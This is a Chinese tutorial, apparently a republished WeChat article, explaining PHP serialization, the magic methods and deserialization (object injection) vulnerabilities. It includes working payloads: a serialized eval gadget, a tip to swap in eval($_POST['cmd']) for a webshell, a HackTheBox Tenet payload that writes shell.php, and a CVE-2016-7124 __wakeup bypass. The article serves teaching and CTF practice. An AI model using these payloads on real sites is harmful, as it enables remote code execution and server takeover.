<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/F31ou2nfTfZrqPC9ab_IAA)

```
声明：以下内容仅供学习参考，切勿进行非授权的网络攻击行为。本文图片从本地文件加载上，需要完整Web方向文档可在社区或公众号索取。

```

1. 理解序列化和反序列化
=============

要学习 PHP 反序列漏洞，先了解下 PHP 序列化和反序列化是什么东西。

为了有效的存储或传递数据，同时不丢失其类型和结构，经常需要序列化和反序列化的函数对数据进行处理。

数据（变量）序列化（持久化）

序列化就是一种用来处理对象流的机制，说通俗点就是把一个对象变成可以传输的字符串，但并不是类型转换，而是将改字符串存储在本地，相反就是反序列化。

主要作用：使得程序间传输对象会更加方便。

```
 序列化：返回字符串，此字符串包含了表示Value的字节流，可以存储在任何地方。可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。
 
 反序列化：对单一的已序列化的变量进行操作，将其转换回原来的值。

```

这两个过程结合起来，可以轻松的存储和传输数据，使程序更具维护性，但是不安全的反序列化回导致代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括重播攻击、注入攻击和特权升级攻击。

PHP 序列化的函数为 serialize。PHP 反序列化的函数为 unserialize。

1.1 序列化的意义
----------

序列化和反序列化的概念

把对象转换为字节序列的过程称为对象的序列化。

把字节序列恢复为对象的过程称为对象的反序列化。

对象的序列化主要有两种用途：

1）把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；

2）在网络上传输对象的字节序列。

在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便长期保存。比如最常见的是 Web 服务器中的 Session 对此，当有 10 万用户并发访问，就可能出现 10 万个 Session 对象，内存可能吃不消，于是 Web 容器就会把这些 Seesion 先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。

2. PHP 反序列化
===========

2.1 什么是序列化与反序列化
---------------

2.2 序列化的概念
----------

**将对象或者数组转化为可存储的字符串。**

在 PHP 中使用 serialize() 函数来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示。

我们使用类的序列化比较多，所以这里就用一个序列化对象的例子来演示：

```
 <?php
 #创建一个类
 class test{
     public $a = 'sdfsdfa';
     protected $b = 1111;
     private  $c = false;
     public function displayVar() {
         echo $this->a;
     }
 }
 $d = new test(); //实例化对象
 $d = serialize($d);//序列化对象
 var_dump($d);//输出序列化后的结果
 ?>

```

运行的结果：

```
 string(73) "O:4:"test":3:{s:1:"a";s:7:"sdfsdfa";s:4:"\000*\000b";i:1111;s:7:"\000test\000c";b:0;}"

```

我们从头开始分析各个部分的数组代表着什么：

**O:4:"test":3** O 代表是对象类型，如果是 a 那就是数组类型; 4 是对象名称的长度，test 是对象名称，3 代表是有 3 个成员。

**s:1:"a";s:7:"sdfsdfa"** 第一个 s 代表变量名称是字符串类型，a 是变量名称；第二个 s 代表变量值是字符串类型，7 是变量值得长度，后面是变量的值。

**s:4:"\000*\000b";i:1111** 这里的字符串不应该是 1 吗？为什么是 4 呢，而且还多了一些字符。我们看到成员变量 b 的属性是 protected；

_protected 属性序列化的时候格式是 %00_%00 成员名 ；*

一个 %00 代表一个字节，所以 protected 有两个 %00，再加上 * 和变量名称长度一共是 4 个字节；

接下来的 i 代表变量数值是整数型。

**s:7:"\000test\000c";b:0** 这里也出现了 %00 字符而且还多了类的名称，为什么呢？我们看到成员变量 c 的属性是 private；

_private 属性序列化的时候格式是 %00 类名 %00 成员名；_

这里也是有两个 %002 个字节加上类名的 4 个字节和变量名一个字节，加起来就是 7 个字节；

下面的 b 代表着变量值是布尔型。

大家在这里有发现对象序列化后为什么方法没有跟着一起序列化呢？

**因为 serialize() 函数只对类的属性序列化，不序列化方法。**

反序列化的概念
-------

**将序列化后的字符串转换回对象或者数组。**

在 PHP 中使用 unserialize() 函数来将序列化后的字符串转换回 PHP 的值，并返回的值可为 integer、float、string、array 或 object 类型。

我们重新用上面的例子并把序列化的结果写入一个文本中存储：

```
 <?php
 class test{
     public $a = 'sdfsdfa';
     protected $b = 1111;
     private  $c = false;
     public function displayVar() {
         echo $this->a;
     }
 }
 $d = new test();
 $d = serialize($d);
 file_put_contents('1.txt',$d);
 ?>

```

我们重新写一个文件，读取刚才存储的文本内容并对内容进行反序列化：

```
 <?php
 
 $d = unserialize(file_get_contents('1.txt'));
 print_r($d);
 echo $d->a;
 ?>

```

大家觉得输出的结果是打印出类的对象和成员变量 $a 的值对吗？并不是：

```
 __PHP_Incomplete_Class Object
 (
     [__PHP_Incomplete_Class_Name] => test
     [a] => sdfsdfa
     [b:protected] => 1111
     [c:test:private] => 
 )

```

**在反序列化的时候要保证有该类存在，因为没有序列化方法，所以我们反序列化回来还要依靠该类的方法进行。**

所以反序列化的写法如下：

```
 <?php
 class test{
     public $a = 'sdfsdfa';
     protected $b = 1111;
     private  $c = false;
     public function displayVar() {
         echo $this->a;
     }
 }
 $d = unserialize(file_get_contents('1.txt'));
 print_r($d);
 echo $d->a;
 ?>

```

最终输出的结果：

```
 test Object
 (
     [a] => sdfsdfa
     [b:protected] => 1111
     [c:test:private] => 
 )
 sdfsdfa

```

**为什么要序列化对象成字符串呢？在开发中又起到什么作用？**

序列化作用：方便传输、方便存储。

因为 PHP 文件执行后会把内存的数据进行销毁，如果下一个文件想用到刚刚销毁对象的属性和值就还要重新实例化 new 一次对象，所以才会将对象进行序列化然后存储，也避免重新实例化带来的耗费。开发中比较好举例就是 session，PHP 中如果使用 php_serialize 引擎，那么存储 session 文件将以序列化的方式存储在文件中，当我们要验证当前用户是否有权限进入该页面时就需要反序列化读取存储在服务器上面的 session 文件的值来判断。

反序列化漏洞的产生
---------

为什么有反序列化的漏洞呢？之前反序列化还不是很火，直到 PHP 的伪协议 phar:// 的反序列化开始。

用 k0rz3n 师傅解释很清晰了：

> PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，是因为程序对输入数据处理不当导致的. 反序列化漏洞的成因在于代码中的  unserialize()  接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。

一句话讲晒就是：**反序列化漏洞是由于 unserialize 函数接收到了恶意的序列化数据篡改成员属性后导致的。**

小试牛刀
----

```
 <?php
 class index {
     private $test;
     public function __construct()
     {
         $this->test = new normal();
     }
     public function __destruct()
     {
         $this->test->action();
     }
 }
 class normal {
     public function action(){
         echo "please attack me";
     }
 }
 class evil {
     var $test2;
     public function action(){
         eval($this->test2);
     }
 }
 unserialize($_GET['test']);

```

我们可以看到正常实例化后会执行 **normal** 类里面的 **action** 方法，但是 unserialize 函数是可控的，我们就可以对其进行攻击，思路就是改变 **index** 类里面 test 属性的值，让它实例化 evil 类，从而执行 evil 里面的 action 方法，同时我们也要修改 evil 类里面的 test2 属性的值。

```
 <?php
 class index {
     private $test;
     public function __construct()
     {
         $this->test = new evil();
     }
 }
 
 class evil {
     var $test2 = 'phpinfo();';
 }
 $a= new index();
 file_put_contents('serialize1.txt',serialize($a));

```

我们把修改过后序列化的提交给 test 参数：

```
 O:5:"index":1:{s:11:"%00index%00test";O:4:"evil":1:{s:5:"test2";s:10:"phpinfo();";\}\}

```

将 phpinfo(); 更改为 eval($_POST['cmd']); 即可反弹 webshell。

有人可能有疑问了，为什么这里就一句 **unserialize($_GET['test'])**，没有实例化的语句，那是怎么执行了语句？

每一次的反序列化都会自动触发一些魔术方法，比如上面例子的**__destruct，**执行反序列化会自动触发里面的方法。但 **construct 就不能，为什么呢？因为序列化本身就是存储一个已经初始化的的对象的值了, 所以没必要去执行** construct, 或者说序列化过程本身没有创建对象这一过程。

PHP 魔术方法
--------

PHP 讲以双下划线__保留为魔术方法，所有的魔术方法 必须 声明为 public。

```
 __construct()，类的构造函数
 
 __destruct()，类的析构函数
 
 __call()，在对象中调用一个不可访问方法时调用
 
 __callStatic()，用静态方式中调用一个不可访问方法时调用
 
 __get()，获得一个类的成员变量时调用
 
 __set()，设置一个类的成员变量时调用
 
 __isset()，当对不可访问属性调用isset()或empty()时调用
 
 __unset()，当对不可访问属性调用unset()时被调用。
 
 __sleep()，执行serialize()时，先会调用这个函数
 
 __wakeup()，执行unserialize()时，先会调用这个函数
 
 __toString()，类被当成字符串时的回应方法
 
 __invoke()，调用函数的方式调用一个对象时的回应方法
 
 __set_state()，调用var_export()导出类时，此静态方法会被调用。
 
 __clone()，当对象复制完成时调用
 
 __autoload()，尝试加载未定义的类
 
 __debugInfo()，打印所需调试信息

```

### __construct()

**__construct()** 被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。但是在序列化和反序列化过程是不会触发的。

```
 <?php
 class User{
 
     public $username;
 
     public function __construct($username)
     {
         $this->username = $username;
         echo "__construct test";
     }
 
 }
 $test = new User("F0rmat");
 $ser = serialize($test);
 unserialize($ser);
 ?>

```

运行结果：

```
 __construct test

```

可以看到，创建对象的时候触发了一次，在后面的序列化和反序列化过程中都没有触发。

### __destruct()

在到某个对象的所有引用都被删除或者当对象被显式销毁时执行的魔术方法。

```
 <?php
 class User{
 
     public function __destruct()
     {
         echo "__destruct test</br>";
     }
 
 }
 $test = new User();
 $ser = serialize($test);
 unserialize($ser);
 ?>

```

运行结果：

```
 __destruct test
 __destruct test

```

可以看到执行了两次**__destruct**，因为一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。

### __call

在对象中调用一个不可访问方法时，**__call()** 会被调用。也就是说你调用了一个对象中不存在的方法，就会触发。

```
 <?php
 class User{
 
     public function __call($arg1,$arg2)
     {
         echo "$arg1,$arg2[0]";
     }
 
 }
 $test = new User();
 $test->callxxx('a');
 ?>

```

运行结果：

```
 callxxx,a

```

可以看到__call 需要定义两个参数，一个是表示调用的函数名，一般开发会在这里报错写 xxx 不存在这个函数，第二个参数是传入的数组，这里只传入了一个 a。

### __callStatic

在静态上下文中调用一个不可访问方法时，**__callStatic()** 会被调用。

```
 <?php
 class User{
 
     public static function __callStatic($arg1,$arg2)
     {
         echo "$arg1,$arg2[0]";
     }
 
 }
 $test = new User();
 $test::callxxx('a');
 ?>

```

运行结果：

```
 callxxx,a

```

这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP  5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 self，parent 和 static）。与**__call** 不同的是需要添加 **static**，只有访问不存在的静态方法才会触发。

### __get

读取不可访问属性的值时，__get() 会被调用。

```
 <?php
 class User{
     public $var1;
     public  function __get($arg1)
     {
         echo $arg1;
     }
 
 }
 $test = new User();
 $test->var2;
 ?>

```

运行结果：

```
 var2

```

**__get** 魔术方法需要一个参数，这个参数代表着访问不存在的属性值。

### __set

给不可访问属性赋值时，**__set()** 会被调用。

```
 <?php
 class User{
     public $var1;
     public  function __set($arg1,$arg2)
     {
         echo $arg1.','.$arg2;
     }
 
 }
 $test = new User();
 $test->var2=1;
 ?>

```

运行结果：

```
 var2,1

```

**set 跟** get 相反，一个是访问不存在的属性，一个是给不存在的属性赋值。

### __isset

对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。

```
 <?php
 class User{
     private $var;
     public  function __isset($arg1)
     {
         echo $arg1;
     }
 
 }
 $test = new User();
 isset($test->var1);
 ?>

```

运行结果：

```
 var1

```

该魔术方法使用了 isset() 或者 empty() 只要属性是 private 或者不存在的都会触发。

### __unset

对不可访问属性调用 unset() 时，__unset() 会被调用。

```
 <?php
 class User{
     public  function __unset($arg1)
     {
         echo $arg1;
     }
 
 }
 $test = new User();
 unset($test->var1);
 ?>

```

运行结果：

```
 var1

```

如果一个类定义了魔术方法 __unset() ，那么我们就可以使用 unset() 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。

### __sleep

**serialize()** 函数会检查类中是否存在一个魔术方法 **__sleep()**。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。

```
 <?php
 class User{
     const SITE = 'uusama';
 
     public $username;
     public $nickname;
     private $password;
 
     public function __construct($username, $nickname, $password)
     {
         $this->username = $username;
         $this->nickname = $nickname;
         $this->password = $password;
     }
 
     // 重载序列化调用的方法
     public function __sleep()
     {
         // 返回需要序列化的变量名，过滤掉password变量
         return array('username', 'nickname');
     }
 
 }
 $user = new User('a', 'b', 'c');
 echo serialize($user);

```

运行结果：

```
 O:4:"User":2:{s:8:"username";s:1:"a";s:8:"nickname";s:1:"b";}

```

可以看到执行序列化之前会先执行 **sleep() 函数，上面** sleep 的函数作用是过滤掉 password 的变量值。

### __wakeup

unserialize() 会检查是否存在一个`__wakeup()`方法。如果存在，则会先调用 `__wakeup()` 方法，预先准备对象需要的资源。

预先准备对象资源，返回 void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。

```
 <?php
 class User{
     const SITE = 'uusama';
 
     public $username;
     public $nickname;
     private $password;
     private $order;
 
     public function __construct($username, $nickname, $password)
     {
         $this->username = $username;
         $this->nickname = $nickname;
         $this->password = $password;
     }
 
     // 定义反序列化后调用的方法
     public function __wakeup()
     {
         $this->password = $this->username;
     }
 }
 $user_ser = 'O:4:"User":2:{s:8:"username";s:1:"a";s:8:"nickname";s:1:"b";}';
 var_dump(unserialize($user_ser));

```

运行结果：

```
 class User#1 (4) {
   public $username =>
   string(1) "a"
   public $nickname =>
   string(1) "b"
   private $password =>
   string(1) "a"
   private $order =>
   NULL
 }

```

可以看到执行反序列化之前会先执行 **wakeup() 函数，上面** wakeup 的函数作用是将 username 的变量值赋值给 password 变量。

### __toString

**__toString()** 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。

```
 <?php
 class User{
 
     public function __toString()
     {
        return '__toString test';
     }
 
 }
 
 $test = new User();
 echo $test;

```

运行结果：

```
 __toString

```

特别注意__toString 的触发条件，引用 k0rz3n 师傅的笔记：

> (1)echo (obj) / print(obj) 打印时会触发 (2) 反序列化对象与字符串连接时 (3) 反序列化对象参与格式化字符串时 (4) 反序列化对象与字符串进行 == 比较时（PHP 进行 == 比较的时候会转换参数类型） (5) 反序列化对象参与格式化 SQL 语句，绑定参数时  (6) 反序列化对象在经过 php 字符串函数，如 strlen()、addslashes() 时  (7) 在 in_array() 方法中，第一个参数是反序列化对象，第二个参数的数组中有 toString 返回的字符串的时候 toString 会被调用  (8) 反序列化的对象作为 class_exists() 的参数的时候

### __invoke

当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。(本特性只在 PHP 5.1.0 及以上版本有效。)

```
 <?php
 class User{
 
     public function __invoke()
     {
        echo '__invoke test';
     }
 
 }
 
 $test = new User();
 $test();

```

运行结果：

```
 __invoke test

```

### __clone

当使用 clone 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 __clone() ，如果该魔术方法存在的话。

```
 <?php
 class User{
 
     public function __clone()
     {
         echo "__clone test";
     }
 
 }
 $test = new User();
 $newclass = clone($test);
 ?>

```

运行结果：

```
 __clone test

```

练习
--

### Hackthebox-Tenet

htb 上面有一道题是反序列化漏洞的题目：

```
 <?php
 
 class DatabaseExport
 {
     public $user_file = 'users.txt';
     public $data = '';
 
     public function update_db()
     {
         echo '[+] Grabbing users from text file <br>';
         $this-> data = 'Success';
     }
 
     public function __destruct()
     {
         file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
         echo '[] Database updated <br>';
     //  echo 'Gotta get this working properly...';
     }
 }
 
 $input = $_GET['arepo'] ?? '';
 $databaseupdate = unserialize($input);
 
 $app = new DatabaseExport;
 $app -> update_db();
 
 ?>

```

这题比较简单哈，上面我们已经讲过了 **serialize** 只对属性进行序列化操作，所以我们只要对属性进行修改就行了：

```
 <?php
 
 class DatabaseExport
 {
     public $user_file = 'shell.php';
     public $data = "<?php phpinfo();?>";
 }
 
 $app = new DatabaseExport;
 echo urlencode(serialize($app));
 ?>

```

### 反序列化对象注入 - CVE-2016-7124

*   漏洞影响版本：
    

PHP5 < 5.6.25

PHP7 < 7.0.10

*   漏洞产生原因：
    

如果存在 wakeup 方法，调用 unserilize() 方法前则先调用 wakeup 方法，但是序列化字符串中表示`对象属性个数`的值`大于` `真实的属性个数`时会跳过__wakeup 的执行

```
 <?php
 error_reporting(0);
 class Test{
     public $key = 'flag';
     function __destruct(){
         if(!empty($this->key)){
             if($this->key == 'flag')
                 echo 'success';
         }
     }
     function __wakeup(){
         $this->key = 'you failed 23333';
         echo $this->key;
     }
     public function __toString(){
         return '';
     }
 }
 if(!isset($_GET['answer'])){
     show_source('index.php');
 }else{
     $answer = $_GET['answer'];
     echo $answer;
     echo '<br>';
     echo unserialize($answer);
 }
 
 ?>

```

按道理我们只要让 key=flag 就行了，payload=O:4:"Test":1:{s:3:"key";s:4:"flag";}

运行结果：

```
 O:4:"Test":1:{s:3:"key";s:4:"flag";}
 you failed 23333

```

这里发现已经被 **wakeup 抢先执行了改变了 key 的值，让** destruct 里面的判断就不成立了。

用我们刚才说的漏洞成因`对象属性个数`的值`大于` `真实的属性个数`时会跳过__wakeup 的执行。

那我们只要改变一下属性的个数就行了：

```
 O:4:"Test":2:{s:3:"key";s:4:"flag";}

```

运行结果：

```
 O:4:"Test":2:{s:3:"key";s:4:"flag";}
 success

```